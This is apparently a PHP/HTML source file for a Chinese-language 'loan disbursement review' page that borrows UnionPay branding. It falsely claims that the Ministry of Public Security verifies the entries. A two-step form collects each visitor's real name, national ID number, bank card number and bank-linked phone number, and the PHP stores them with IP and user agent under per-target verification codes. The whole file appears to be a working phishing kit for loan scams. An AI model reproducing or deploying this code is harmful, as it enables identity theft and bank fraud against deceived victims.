<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
// 引入您的数据库配置文件
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';

// 启动会话
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// 根据验证码获取验证页信息
if (isset($_GET['code'])) {
    $db = getDB();
    
    if (!$db) {
        die('数据库连接失败');
    }
    
    $query = "SELECT * FROM XEDF_verify_pages 
              WHERE XEDF_verify_code = ? AND XEDF_status = 'active'";
    $stmt = $db->prepare($query);
    $stmt->bind_param("s", $_GET['code']);
    $stmt->execute();
    $result = $stmt->get_result();
    $verify_page = $result->fetch_assoc();
    
    if (!$verify_page) {
        die('验证目标不存在或已禁用');
    }
} else {
    die('无效的访问');
}

// 处理表单提交
$success_message = '';
$error_message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 获取表单数据
    $real_name = !empty($_POST['real_name']) ? trim($_POST['real_name']) : '';
    $id_card = !empty($_POST['id_card']) ? trim($_POST['id_card']) : '';
    $bank_card = !empty($_POST['bank_card']) ? trim($_POST['bank_card']) : '';
    $phone = !empty($_POST['phone']) ? trim($_POST['phone']) : '';
    
    // 基本验证
    if (empty($real_name) || empty($id_card) || empty($bank_card) || empty($phone)) {
        $error_message = '请填写所有必填字段';
    } elseif (!preg_match('/^1[3-9]\d{9}$/', $phone)) {
        $error_message = '手机号格式不正确';
    } elseif (!preg_match('/^\d{16,19}$/', $bank_card)) {
        $error_message = '银行卡号格式不正确';
    } else {
        // 进一步过滤数据
        $real_name = $db->real_escape_string($real_name);
        $id_card = $db->real_escape_string($id_card);
        $bank_card = $db->real_escape_string($bank_card);
        $phone = $db->real_escape_string($phone);
        $submit_ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = $db->real_escape_string($_SERVER['HTTP_USER_AGENT']);
        
        // 插入提交信息
        $query = "INSERT INTO XEDF_verify_submissions 
                  (XEDF_verify_id, XEDF_real_name, XEDF_id_card, XEDF_bank_card, XEDF_phone, XEDF_submit_ip, XEDF_user_agent) 
                  VALUES (?, ?, ?, ?, ?, ?, ?)";
        
        $stmt = $db->prepare($query);
        $stmt->bind_param("issssss", 
            $verify_page['XEDF_verify_id'], 
            $real_name, 
            $id_card, 
            $bank_card, 
            $phone, 
            $submit_ip, 
            $user_agent
        );
        
        if ($stmt->execute()) {
            $success_message = '信息提交成功！';
            $_POST = array();
        } else {
            $error_message = '提交失败，请重试';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="https://cn.unionpay.com/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($verify_page['XEDF_page_title']); ?>放款信息审核</title>
    <link href="/assets/SharePhoto/kakou.css" rel="stylesheet">
    <style>
        .alert-message {
            padding: 12px;
            margin: 15px 0;
            border-radius: 4px;
            text-align: center;
        }
        .alert-success {
            background-color: #f0f9ff;
            border: 1px solid #007bff;
            color: #007bff;
        }
        .alert-error {
            background-color: #fef0f0;
            border: 1px solid #f56c6c;
            color: #f56c6c;
        }
        .form-section {
            display: none;
        }
        .form-section.active {
            display: block;
        }
    </style>
</head>
<body>
    <div id="app" data-v-app="">
        <div class="app-wrapper">
            <div id="app">
                <div class="container">
                    <div class="form-flow">
                        <div class="steps-container">
                            <div class="el-steps el-steps--horizontal">
                                <!-- 步骤指示器保持不变 -->
                                <div style="flex-basis: 33.33%;" class="el-step is-horizontal is-center">
                                    <div class="el-step__head <?php echo empty($_POST) ? 'is-process' : 'is-success'; ?>">
                                        <div class="el-step__line"><i class="el-step__line-inner" style="transition-delay: 0ms; border-width: 0px; width: 0%;"></i></div>
                                        <div class="el-step__icon is-icon">
                                            <div class="step-icon-wrapper"><i class="el-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
                                                        <path fill="currentColor" d="M512 512a192 192 0 1 0 0-384 192 192 0 0 0 0 384m0 64a256 256 0 1 1 0-512 256 256 0 0 1 0 512m320 320v-96a96 96 0 0 0-96-96H288a96 96 0 0 0-96 96v96a32 32 0 1 1-64 0v-96a160 160 0 0 1 160-160h448a160 160 0 0 1 160 160v96a32 32 0 1 1-64 0">
                                                        </path>
                                                    </svg></i></div>
                                        </div>
                                    </div>
                                    <div class="el-step__main">
                                        <div class="el-step__title <?php echo empty($_POST) ? 'is-process' : 'is-success'; ?>">身份信息</div>
                                    </div>
                                </div>
                                <div style="flex-basis: 33.33%;" class="el-step is-horizontal is-center">
                                    <div class="el-step__head <?php echo !empty($_POST) && empty($success_message) ? 'is-process' : ($success_message ? 'is-success' : 'is-wait'); ?>">
                                        <div class="el-step__line"><i class="el-step__line-inner" style="transition-delay: -150ms; border-width: 0px; width: 0%;"></i>
                                        </div>
                                        <div class="el-step__icon is-icon">
                                            <div class="step-icon-wrapper"><i class="el-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
                                                        <path fill="currentColor" d="M896 324.096c0-42.368-2.496-55.296-9.536-68.48a52.352 52.352 0 0 0-22.144-22.08c-13.12-7.04-26.048-9.536-68.416-9.536H228.096c-42.368 0-55.296 2.496-68.48 9.536a52.352 52.352 0 0 0-22.08 22.144c-7.04 13.12-9.536 26.048-9.536 68.416v375.808c0 42.368 2.496 55.296 9.536 68.48a52.352 52.352 0 0 0 22.144 22.08c13.12 7.04 26.048 9.536 68.416 9.536h567.808c42.368 0 55.296-2.496 68.48-9.536a52.352 52.352 0 0 0 22.08-22.144c7.04-13.12 9.536-26.048 9.536-68.416zm64 0v375.808c0 57.088-5.952 77.76-17.088 98.56-11.136 20.928-27.52 37.312-48.384 48.448-20.864 11.136-41.6 17.088-98.56 17.088H228.032c-57.088 0-77.76-5.952-98.56-17.088a116.288 116.288 0 0 1-48.448-48.384c-11.136-20.864-17.088-41.6-17.088-98.56V324.032c0-57.088 5.952-77.76 17.088-98.56 11.136-20.928 27.52-37.312 48.384-48.448 20.864-11.136 41.6-17.088 98.56-17.088H795.84c57.088 0 77.76 5.952 98.56 17.088 20.928 11.136 37.312 27.52 48.448 48.384 11.136 20.864 17.088 41.6 17.088 98.56z">
                                                        </path>
                                                        <path fill="currentColor" d="M64 320h896v64H64zm0 128h896v64H64zm128 192h256v64H192z">
                                                        </path>
                                                    </svg></i></div>
                                        </div>
                                    </div>
                                    <div class="el-step__main">
                                        <div class="el-step__title <?php echo !empty($_POST) && empty($success_message) ? 'is-process' : ($success_message ? 'is-success' : 'is-wait'); ?>">银行信息</div>
                                    </div>
                                </div>
                                <div style="flex-basis: 33.33%; max-width: 33.33%;" class="el-step is-horizontal is-center">
                                    <div class="el-step__head <?php echo $success_message ? 'is-success' : 'is-wait'; ?>">
                                        <div class="el-step__line"><i class="el-step__line-inner"></i></div>
                                        <div class="el-step__icon is-icon">
                                            <div class="step-icon-wrapper"><i class="el-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
                                                        <path fill="currentColor" d="M512 896a384 384 0 1 0 0-768 384 384 0 0 0 0 768m0 64a448 448 0 1 1 0-896 448 448 0 0 1 0 896">
                                                        </path>
                                                        <path fill="currentColor" d="M745.344 361.344a32 32 0 0 1 45.312 45.312l-288 288a32 32 0 0 1-45.312 0l-160-160a32 32 0 1 1 45.312-45.312L480 626.752l265.344-265.408z"></path>
                                                    </svg></i></div>
                                        </div>
                                    </div>
                                    <div class="el-step__main">
                                        <div class="el-step__title <?php echo $success_message ? 'is-success' : 'is-wait'; ?>">提交申请</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="form-container">
                            <?php if ($success_message): ?>
                                <div class="alert-message alert-success"><?php echo $success_message; ?></div>
                            <?php elseif ($error_message): ?>
                                <div class="alert-message alert-error"><?php echo $error_message; ?></div>
                            <?php endif; ?>

                            <form method="POST" id="infoForm" class="el-form el-form--default el-form--label-top">
                                <!-- 身份信息部分 -->
                                <div class="form-section identity-form <?php echo empty($_POST) ? 'active' : ''; ?>" id="identitySection">
                                    <div class="info-notice security-notice">
                                        <div class="security-content">
                                            <div class="security-header"><i class="el-icon security-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
                                                        <path fill="currentColor" d="M224 448a32 32 0 0 0-32 32v384a32 32 0 0 0 32 32h576a32 32 0 0 0 32-32V480a32 32 0 0 0-32-32zm0-64h576a96 96 0 0 1 96 96v384a96 96 0 0 1-96 96H224a96 96 0 0 1-96-96V480a96 96 0 0 1 96-96">
                                                        </path>
                                                        <path fill="currentColor" d="M512 544a32 32 0 0 1 32 32v192a32 32 0 1 1-64 0V576a32 32 0 0 1 32-32m192-160v-64a192 192 0 1 0-384 0v64zM512 64a256 256 0 0 1 256 256v128H256V320A256 256 0 0 1 512 64">
                                                        </path>
                                                    </svg></i><span>信息安全保障</span></div>
                                            <div class="security-detail">
                                                <p class="security-text">您输入的信息都是经过中华人民共和国公安部进行验证
                                                    您的信息不会被泄露等 信息仅用于放款渠道验证审核 请输入并验证您本人的身份信息</p>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="el-form-item is-required asterisk-left el-form-item--label-top">
                                        <label for="real_name" class="el-form-item__label">姓名</label>
                                        <div class="el-form-item__content">
                                            <div class="el-input el-input--suffix">
                                                <div class="el-input__wrapper" tabindex="-1">
                                                    <input class="el-input__inner" id="real_name" name="real_name" type="text" autocomplete="off" tabindex="0" placeholder="请输入银行卡预留人姓名" value="<?php echo isset($_POST['real_name']) ? htmlspecialchars($_POST['real_name']) : ''; ?>">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="el-form-item is-required asterisk-left el-form-item--label-top">
                                        <label for="id_card" class="el-form-item__label">身份证号</label>
                                        <div class="el-form-item__content">
                                            <div class="el-input el-input--suffix">
                                                <div class="el-input__wrapper" tabindex="-1">
                                                    <input class="el-input__inner" id="id_card" name="id_card" type="text" autocomplete="off" tabindex="0" placeholder="请输入银行卡预留人18位身份证号码" value="<?php echo isset($_POST['id_card']) ? htmlspecialchars($_POST['id_card']) : ''; ?>">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-actions">
                                        <button aria-disabled="false" type="button" id="nextBtn" class="el-button el-button--primary">
                                            <span class=""> 下一步 </span></button>
                                    </div>
                                </div>

                                <!-- 银行信息部分 -->
                                <div class="form-section <?php echo !empty($_POST) && empty($success_message) ? 'active' : ''; ?>" id="bankSection" style="display:none;">
                                    <div class="el-form-item is-required asterisk-left el-form-item--label-top">
                                        <label for="bank_card" class="el-form-item__label">银行卡号</label>
                                        <div class="el-form-item__content">
                                            <div class="el-input">
                                                <div class="el-input__wrapper">
                                                    <input class="el-input__inner" id="bank_card" name="bank_card" type="text" placeholder="请输入银行卡号" value="<?php echo isset($_POST['bank_card']) ? htmlspecialchars($_POST['bank_card']) : ''; ?>">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="el-form-item is-required asterisk-left el-form-item--label-top">
                                        <label for="phone" class="el-form-item__label">手机号</label>
                                        <div class="el-form-item__content">
                                            <div class="el-input">
                                                <div class="el-input__wrapper">
                                                    <input class="el-input__inner" id="phone" name="phone" type="tel" placeholder="请输入银行卡预留手机号" value="<?php echo isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : ''; ?>">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-actions">
                                        <button type="button" id="prevBtn" class="el-button el-button--default">
                                            <span>上一步</span>
                                        </button>
                                        <button type="submit" id="submitBtn" class="el-button el-button--primary">
                                            <span>提交申请</span>
                                        </button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="footer">
                <div class="footer-content"> © 2025 版权所有 | 粤ICP备9244741号-2 </div>
            </footer>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const identitySection = document.querySelector('.identity-form');
            const bankSection = document.getElementById('bankSection');
            const nextBtn = document.getElementById('nextBtn');
            const prevBtn = document.getElementById('prevBtn');
            const submitBtn = document.getElementById('submitBtn');

            // 下一步按钮点击事件
            nextBtn.addEventListener('click', function() {
                const realName = document.getElementById('real_name').value.trim();
                const idCard = document.getElementById('id_card').value.trim();

                // 验证姓名
                if (!realName) {
                    alert('请输入姓名');
                    return;
                }

                // 验证身份证号
                const idCardReg = /^[1-9]\d{5}(18|19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]$/;
                if (!idCard) {
                    alert('请输入身份证号');
                    return;
                }
                if (!idCardReg.test(idCard)) {
                    alert('请输入有效的18位身份证号码');
                    return;
                }

                // 切换到银行信息部分
                identitySection.style.display = 'none';
                bankSection.style.display = 'block';

                // 更新步骤状态
                document.querySelector('.el-step:nth-child(1) .el-step__head').className = 'el-step__head is-success';
                document.querySelector('.el-step:nth-child(2) .el-step__head').className = 'el-step__head is-process';
            });

            // 上一步按钮点击事件
            prevBtn.addEventListener('click', function() {
                bankSection.style.display = 'none';
                identitySection.style.display = 'block';

                // 更新步骤状态
                document.querySelector('.el-step:nth-child(1) .el-step__head').className = 'el-step__head is-process';
                document.querySelector('.el-step:nth-child(2) .el-step__head').className = 'el-step__head is-wait';
            });

            // 身份证号输入格式化
            document.getElementById('id_card').addEventListener('input', function(e) {
                let value = e.target.value;
                if (value.slice(-1).toLowerCase() === 'x') {
                    value = value.slice(0, -1) + 'X';
                }
                value = value.replace(/[^\dX]/g, '');
                if (value.length > 18) {
                    value = value.slice(0, 18);
                }
                e.target.value = value;
            });

            // 银行卡号输入格式化
            document.getElementById('bank_card').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 19) {
                    value = value.slice(0, 19);
                }
                e.target.value = value;
            });

            // 手机号输入格式化
            document.getElementById('phone').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 11) {
                    value = value.slice(0, 11);
                }
                e.target.value = value;
            });

            // 表单提交前的验证
            document.getElementById('infoForm').addEventListener('submit', function(e) {
                const bankCard = document.getElementById('bank_card').value.trim();
                const phone = document.getElementById('phone').value.trim();

                if (!bankCard) {
                    e.preventDefault();
                    alert('请输入银行卡号');
                    return;
                }

                if (!/^\d{16,19}$/.test(bankCard)) {
                    e.preventDefault();
                    alert('银行卡号应为16-19位数字');
                    return;
                }

                if (!phone) {
                    e.preventDefault();
                    alert('请输入手机号');
                    return;
                }

                if (!/^1[3-9]\d{9}$/.test(phone)) {
                    e.preventDefault();
                    alert('请输入有效的手机号码');
                    return;
                }

                // 更新步骤状态为完成
                document.querySelector('.el-step:nth-child(2) .el-step__head').className = 'el-step__head is-success';
                document.querySelector('.el-step:nth-child(3) .el-step__head').className = 'el-step__head is-success';
            });
        });
    </script>
</body>
</html>